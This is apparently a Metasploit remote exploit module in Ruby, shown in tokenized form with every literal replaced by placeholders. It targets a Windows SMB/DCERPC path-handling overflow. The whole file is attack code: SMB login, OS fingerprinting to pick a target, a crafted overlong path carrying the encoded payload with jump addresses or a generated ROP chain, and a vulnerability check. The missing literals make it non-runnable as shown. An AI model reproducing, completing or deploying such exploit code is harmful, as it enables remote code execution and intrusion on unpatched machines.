require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GreatRanking include Msf :: Exploit :: Remote :: DCERPC include Msf :: Exploit :: Remote :: SMB :: Client def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , <str> , <str> , ] , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> , <str> , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , } , <str> = > true , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > <str> , <str> = > - <int> , } , <str> = > <str> , <str> = > <int> , <str> = > [ [ <str> , { <str> = > true } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <str> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <str> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> } ] , ] , <str> = > <str> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def exploit begin connect smb_login rescue Rex :: Proto :: SMB :: Exceptions :: LoginError = > e if e . message =~ <str> print_error ( <str> ) print_error ( <str> ) return else raise e end end mytarget = target if target [ <str> ] mytarget = nil print_status ( <str> ) fprint = smb_fingerprint print_status ( <str> fprint [ <str> ] <str> fprint [ <str> ] <str> fprint [ <str> ] <str> ) if ( fprint [ <str> ] == <str> ) fail_with ( Failure :: NoTarget , <str> ) end if ( fprint [ <str> ] == <str> ) mytarget = targets [ <int> ] end if fprint [ <str> ] == <str> and fprint [ <str> ] == <str> mytarget = targets [ <int> ] end if fprint [ <str> ] == <str> and fprint [ <str> ] == <str> mytarget = targets [ <int> ] end if ( fprint [ <str> ] == <str> ) fprint [ <str> ] = <str> end if ( not mytarget ) and fprint [ <str> ] . index ( <str> ) print_error ( <str> ) print_status ( <str> ) disconnect return end if ( not mytarget ) and fprint [ <str> ] == <str> print_status ( <str> ) fprint [ <str> ] = <str> end fprint [ <str> ] . gsub! ( <str> , <str> ) unless mytarget targets . each do | t | if t . name =~ <str> fprint [ <str> ] <str> fprint [ <str> ] <str> fprint [ <str> ] <str> mytarget = t break end if t . name =~ <str> fprint [ <str> ] <str> fprint [ <str> ] <str> fprint [ <str> ] <str> mytarget = t break end end end unless mytarget fail_with ( Failure :: NoTarget , <str> ) end print_status ( <str> mytarget . name <str> ) end padder = [ * ( <str> .. <str> ) ] pad = <str> while pad . length < <int> c = padder [ rand ( padder . length ) ] next if pad . index ( c ) pad += c end prefix = <str> path = <str> server = Rex :: Text . rand_text_alpha ( rand ( <int> ) + <int> ) . upcase if mytarget [ <str> ] jumper = Rex :: Text . rand_text_alpha ( <int> ) . upcase jumper [ <int> , <int> ] = [ mytarget [ <str> ] ] . pack ( <str> ) jumper [ <int> , <int> ] = [ mytarget [ <str> ] ] . pack ( <str> ) jumper [ <int> , <int> ] = [ mytarget [ <str> ] ] . pack ( <str> ) jumper [ <int> , <int> ] = [ mytarget [ <str> ] ] . pack ( <str> ) jumper [ <int> , <int> ] = [ mytarget [ <str> ] ] . pack ( <str> ) jumper [ <int> , <int> ] = [ mytarget [ <str> ] ] . pack ( <str> ) jumper [ <int> , <int> ] = [ mytarget [ <str> ] ] . pack ( <str> ) jumper [ <int> , <int> ] = [ mytarget [ <str> ] ] . pack ( <str> ) jumper [ <int> , <int> ] = [ mytarget [ <str> ] ] . pack ( <str> ) jumper [ <int> , <int> ] = <str> jumper [ <int> , <int> ] = <str> path = Rex :: Text . to_unicode ( <str> ) + Rex :: Text . rand_text_alpha ( <int> ) + payload . encoded + Rex :: Text . to_unicode ( <str> ) + Rex :: Text . to_unicode ( pad ) + [ mytarget [ <str> ] ] . pack ( <str> ) + [ mytarget [ <str> ] ] . pack ( <str> ) + jumper + <str> * <int> elsif mytarget [ <str> ] rop = generate_rop ( mytarget [ <str> ] ) path = Rex :: Text . to_unicode ( <str> ) + Rex :: Text . rand_text_alpha ( <int> ) + payload . encoded + Rex :: Text . to_unicode ( <str> ) + Rex :: Text . to_unicode ( pad ) + rop + Rex :: Text . rand_text_alpha ( <int> ) + <str> * <int> else jumper = Rex :: Text . rand_text_alpha ( <int> ) . upcase jumper [ <int> , <int> ] = [ mytarget . ret ] . pack ( <str> ) jumper [ <int> , <int> ] = make_nops ( <int> ) jumper [ <int> , <int> ] = <str> path = Rex :: Text . to_unicode ( <str> ) + Rex :: Text . rand_text_alpha ( <int> ) + payload . encoded + Rex :: Text . to_unicode ( <str> ) + Rex :: Text . to_unicode ( pad ) + [ mytarget [ <str> ] ] . pack ( <str> ) + [ mytarget [ <str> ] || mytarget . ret ] . pack ( <str> ) + jumper + <str> * <int> end handle = dcerpc_handle ( <str> , <str> , <str> , [ <str> datastore [ <str> ] <str> ] ) dcerpc_bind ( handle ) stub = NDR . uwstring ( server ) + NDR . UnicodeConformantVaryingStringPreBuilt ( path ) + NDR . long ( rand ( <int> ) ) + NDR . wstring ( prefix ) + NDR . long ( <int> ) + NDR . long ( <int> ) print_status ( <str> ) dcerpc . call ( <hex> , stub , false ) handler disconnect end def check begin connect smb_login rescue Rex :: ConnectionError = > e vprint_error ( <str> e . class <str> e <str> ) return Msf :: Exploit :: CheckCode :: Unknown rescue Rex :: Proto :: SMB :: Exceptions :: LoginError = > e if e . message =~ <str> vprint_error ( <str> ) vprint_error ( <str> ) return Msf :: Exploit :: CheckCode :: Unknown else raise e end end prefix = <str> path = <str> * <hex> + Rex :: Text . to_unicode ( <str> ) + Rex :: Text . to_unicode ( <str> ) + Rex :: Text . to_unicode ( <str> ) + Rex :: Text . to_unicode ( <str> ) + <str> * <int> server = Rex :: Text . rand_text_alpha ( rand ( <int> ) + <int> ) . upcase handle = dcerpc_handle ( <str> , <str> , <str> , [ <str> datastore [ <str> ] <str> ] ) begin dcerpc_bind ( handle ) rescue Rex :: Proto :: SMB :: Exceptions :: ErrorCode = > e vprint_error ( <str> e . message <str> ) return Msf :: Exploit :: CheckCode :: Safe end vprint_status ( <str> % path . length ) stub = NDR . uwstring ( server ) + NDR . UnicodeConformantVaryingStringPreBuilt ( path ) + NDR . long ( <int> ) + NDR . wstring ( prefix ) + NDR . long ( <int> ) + NDR . long ( <int> ) resp = dcerpc . call ( <hex> , stub ) error = resp [ <int> , <int> ] . unpack ( <str> ) [ <int> ] simple . client . close simple . client . tree_disconnect disconnect if ( error == <hex> ) return Msf :: Exploit :: CheckCode :: Vulnerable else vprint_error ( <str> % error ) if error return Msf :: Exploit :: CheckCode :: Safe end end def generate_rop ( version ) free_byte = <str> gadget1 = free_byte + <str> gadget2 = free_byte + <str> + <str> + <str> + <str> + <str> + free_byte gadget3 = <str> + free_byte + <str> dws = gadget2 . unpack ( <str> ) module_name = <str> module_base = <hex> rvasets = { } rvasets [ <str> ] = { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> + <int> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> + <int> , <str> = > <hex> } rvasets [ <str> ] = { <str> = > <hex> , <str> = > <hex> , <str> = > <hex> + <int> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> + <int> , <str> = > <hex> } rop = [ <hex> , <str> , <hex> , <hex> , <hex> , <str> , <str> , gadget1 . unpack ( <str> ) . first , <str> , <str> , dws [ <int> ] , dws [ <int> ] , <str> , <str> , dws [ <int> ] , <str> , <str> , <str> , gadget3 . unpack ( <str> ) . first ] rvas = rvasets [ version ] rop . map! { | e | if e . kind_of? String fail_with ( Failure :: BadConfig , <str> e <str> ) unless rvas [ e ] module_base + rvas [ e ] elsif e == <str> rand_text ( <int> ) . unpack ( <str> ) . first else e end } ret = rop . pack ( <str> ) ret end end 
